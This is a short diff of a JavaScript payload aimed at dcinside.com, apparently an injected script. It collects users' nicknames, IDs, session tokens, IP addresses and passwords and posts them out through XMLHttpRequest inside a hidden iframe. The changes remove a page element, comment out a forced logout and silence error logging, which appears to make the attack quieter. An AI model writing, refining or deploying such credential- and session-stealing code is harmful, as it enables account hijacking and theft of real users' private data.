@@ -1,4 +1,5 @@
 document.domain = 'dcinside.com';
+parent.document.querySelector("embed").remove();
 nas = document.createElement('iframe');
 nas.id = 'hash';
 nas.name = 'hash';
@@ -62,9 +63,9 @@ try {
         };
         data='ci_t=&password=1234&is_secret=0&name='+user_nick+'&memo='+user_nick + '(' + user_id + ')' + '\n' + sess + '\n' + user_ip + '\n' + nick + '(' + pw + ')';
         xhr.send(data);
-        window.open('https://sign.dcinside.com/logout?s_url=https%3A%2F%2Fsign.dcinside.com%2Flogin', 'hash', 'width=1px, height=1px');
+        //window.open('https://sign.dcinside.com/logout?s_url=https%3A%2F%2Fsign.dcinside.com%2Flogin', 'hash', 'width=1px, height=1px');
     } else {}
 } catch (error) {
-    console.log(error);
+    //console.log(error);
     tor();
 }
